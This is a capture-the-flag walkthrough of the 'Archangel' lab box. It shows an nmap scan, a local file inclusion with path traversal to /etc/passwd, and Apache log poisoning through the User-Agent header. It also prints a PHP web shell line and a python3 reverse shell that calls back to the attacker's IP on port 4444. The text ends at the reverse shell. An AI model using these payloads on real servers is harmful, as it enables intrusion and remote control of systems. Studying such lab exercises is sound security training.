---
layout: post
title: Archangel
date: 12-07-2025
categories: [easy]
tags: [exfiltration, LFI, commandinjection, wget]
image: "https://i.pinimg.com/736x/05/ef/8b/05ef8bdaa588d33c1992fc9aea51cc3c.jpg"
---

> Hi! it has been long time: welcome back lets learn web exploitation LFI and privilage escalation.
{: .prompt-tip }

## Scanning
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 21:39 EAT
Nmap scan report for mafialive.thm (10.10.209.210)
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/test.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.51 seconds

```

## Enumerating

Try /robots.txt
but nothing give me clue here, But i can see the email address having the domain name added to the hosts in my device

```
echo "<ip adress> mafialive.thm" >> /etc/hosts
```
Accessing this site and just junck point find the flag.
<img width="1115" height="206" alt="image" src="https://github.com/user-attachments/assets/32674eec-f6a8-4d96-8bb2-f78b212272bb" />

try to visite /robots.txt
<img width="1115" height="206" alt="image" src="https://github.com/user-attachments/assets/7ad6df15-cb6e-42ee-9399-f439b1e03060" />

Try to see the button function
<img width="1115" height="206" alt="image" src="https://github.com/user-attachments/assets/68a877e4-5fa3-49ce-b263-57382bd78d0b" />

Oooh we can now try to find the function of the button.


> Turn on the proxy and try to use burp suite to cpture the requests.
> On this page, we can't see much except a button which when clicked prints "Control is an illusion". But if we see closely, then when we click on the button the parameter ?view=/var/www/html/development_testing/mrrobot.php gets added to the URL. The entire path of the page mrrobot.php is provided over here which appears to be a bit odd because normally relative paths can be used.
{: .prompt-tip }

## Initial access

```
GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 (X11; Android x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mafialive.thm/test.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
> This redirect me to /var/www/html/....
> This is the hint to have LFI.
{: .prompt-danger }

/var/www/html/development_testing/..//..//..//..//..//etc/passwd

Try to access
```
Log files
/var/log/apache2/access.log
/var/log/nginx/access.log

all have been access well.
```

## Prove the exploit

LOG POISONING
Play with User agent by change it to android
```
User-Agent: Mozilla/5.0 (X11; Android x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
```
```
10.6.37.116 - - [12/Jul/2025:12:36:12 +0530] "GET /test.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
10.6.37.116 - - [12/Jul/2025:12:36:14 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
10.6.37.116 - - [12/Jul/2025:12:41:59 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 486 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Android x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
```

Lets try to test using php tags if we can write

<img width="1622" height="733" alt="image" src="https://github.com/user-attachments/assets/089e7b21-0cd9-4b0d-b8cf-0363e643361a" />

## Reverse shell
```
<?php system($_GET['cmd']); ?>
```
<img width="1497" height="778" alt="image" src="https://github.com/user-attachments/assets/f8d81e33-204e-47e2-9dcd-55c4c7ea8cf1" />

python3 was present

payload and crafted it well.
```
python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.6.37.116",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'
```












